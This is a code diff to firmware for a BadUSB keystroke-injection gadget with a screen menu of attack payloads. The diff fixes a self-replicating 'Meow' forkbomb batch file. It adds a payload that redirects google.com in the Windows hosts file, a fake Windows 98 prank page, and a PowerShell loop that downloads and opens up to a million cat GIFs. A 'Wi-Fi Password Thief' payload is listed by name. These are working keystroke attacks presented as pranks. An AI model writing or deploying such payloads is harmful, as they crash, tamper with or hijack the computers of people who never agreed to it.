@@ -27,7 +27,7 @@
 #define LED_PIN 25
 
 // software definitions
-#define DELAY 10 // this is a very small delay added to select times where the keyboard timing is too fast for host to handle
+#define DELAY 20 // this is a very small delay added to select times where the keyboard timing is too fast for host to handle
 
 #define SCREEN_ROTATION 2
 
@@ -94,7 +94,7 @@ uint16_t bgcolor = ST77XX_BLACK;
 uint16_t textcolor = ST77XX_GREEN;
 
 // PROGMEM payloads variables
-const PROGMEM int PROGMEM_PAYLOAD_COUNT = 7;
+const PROGMEM int PROGMEM_PAYLOAD_COUNT = 10;
 const PROGMEM String PROGMEM_PAYLOAD_NAMES[] = 
 { 
     "Power Down Now", 
@@ -102,7 +102,10 @@ const PROGMEM String PROGMEM_PAYLOAD_NAMES[] =
     "Meow Forkbomb",
     "Wi-Fi Password Thief",
     "Rotate Screen",
+    "Google Who?",
+    "Fake Windows 98",
     "Rick Roll",
+    "Cat GIF Bomb",
     "Delay Scroll Test"
 };
 const PROGMEM String PROGMEM_PAYLOADS[] =
@@ -132,7 +135,7 @@ const PROGMEM String PROGMEM_PAYLOADS[] =
     "STRING ( echo @echo off && echo :meow && echo echo meow! :3 && echo start %temp%/meow.bat && echo goto meow ) > %temp%/meow.bat\n"
     "ENTER\n"
     "DELAY 500\n"
-    "STRING %temp%/meow.\n"
+    "STRING %temp%/meow.bat\n"
     "ENTER\n",
     // Wi-Fi Password Thief
     "GUI r\n"
@@ -159,29 +162,64 @@ const PROGMEM String PROGMEM_PAYLOADS[] =
     "STRING display settings\n"
     "DELAY 500\n"
     "ENTER\n"
+    "DELAY 2000\n"
+    "TAB\n"
+    "DELAY 200\n"
+    "TAB\n"
+    "DELAY 200\n"
+    "TAB\n"
+    "DELAY 200\n"
+    "TAB\n"
+    "DELAY 200\n"
+    "TAB\n"
+    "DELAY 200\n"
+    "ENTER\n"
+    "DELAY 200\n"
+    "DOWNARROW\n"
+    "DOWNARROW\n"
+    "DELAY 100\n"
+    "ENTER\n"
+    "DELAY 200\n"
+    "TAB\n"
+    "DELAY 100\n"
+    "ENTER\n"
     "DELAY 1000\n"
-    "TAB\n"
-    "DELAY 100\n"
-    "TAB\n"
-    "DELAY 100\n"
-    "TAB\n"
-    "DELAY 100\n"
-    "TAB\n"
-    "DELAY 100\n"
-    "TAB\n"
-    "DELAY 100\n"
-    "ENTER\n"
-    "DELAY 100\n"
+    "ALT F4\n"
+    "DELAY 500\n",
+    // Google Who?
+    "ESCAPE\n"
+    "CONTROL ESCAPE\n"
+    "DELAY 500\n"
+    "STRING cmd\n"
+    "DELAY 500\n"
+    "MENU\n"
+    "DELAY 500\n"
     "DOWNARROW\n"
-    "DOWNARROW\n"
-    "DELAY 100\n"
     "ENTER\n"
-    "DELAY 200\n"
-    "TAB\n"
-    "DELAY 100\n"
-    "ENTER\n",
+    "DELAY 1000\n"
+    "LEFTARROW\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRING cd C:/Windows/System32/drivers/etc/\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING echo 127.0.0.1 www.google.com>>hosts\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING ipconfig /flushdns\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "ALT SPACE\n"
+    "STRING c\n",
+    // Fake Windows 98
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING https://zhangsixiang.gitee.io/windowsupdateprankbyfediafedia/windows98/index.html\n"
+    "ENTER\n"
+    "DELAY 2000\n"
+    "F11\n"
+    "DELAY 500\n",
     // Rick Roll
-    "DELAY 200\n"
     "GUI r\n"
     "DELAY 50\n"
     "STRING powershell.exe\n"
@@ -201,8 +239,19 @@ const PROGMEM String PROGMEM_PAYLOADS[] =
     "STRING https:\\www.youtube.com/watch?v=dQw4w9WgXcQ\n"
     "DELAY 100\n"
     "ENTER\n"
-    "DELAY 5000\n"
+    "DELAY 10000\n"
     "STRING F\n",
+    // Cat GIF Bomb
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING powershell\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "STRING For( $i=1; $i -lt 1000000; $i++ ) { Invoke-WebRequest \"https://thecatapi.com/api/images/get?format=src&type=gif\" -O \"cat$i.gif\"; start cat$i.gif }\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRING exit\n"
+    "ENTER\n",
     // Delay Scroll Test
     "DELAY 100                                 ;\n"
     "DELAY 200\n"
@@ -235,8 +284,6 @@ void setup() {
     // init led pin
     pinMode( LED_PIN, OUTPUT );
 
-    delay( 100 );
-
     // init tft screen
     tft.initR( INITR_BLACKTAB );
     tft.setRotation( SCREEN_ROTATION );
@@ -255,6 +302,9 @@ void setup() {
 // menu for PROGMEM payloads because i cant find my free microsd card from micro center ;-;
 void payloadMenuPROGMEM()
 {
+    // Turn off led
+    digitalWrite( LED_PIN, LOW );
+
     // prepare tft for printing menu text
     tft.setTextColor( textcolor );
     tft.setTextWrap( false );
@@ -427,7 +477,11 @@ void processLine( String line )
             line == "PRINTSCREEN" ||
             line == "SCROLLLOCK" ||
             line == "SPACE" ||
-            line == "TAB" ) 
+            line == "TAB" ||
+            line == "F1" || line == "F2" || line == "F3" ||
+            line == "F4" || line == "F5" || line == "F6" ||
+            line == "F7" || line == "F8" || line == "F9" ||
+            line == "F10" || line == "F11" || line == "F12" ) 
         {
             command = line;
         }
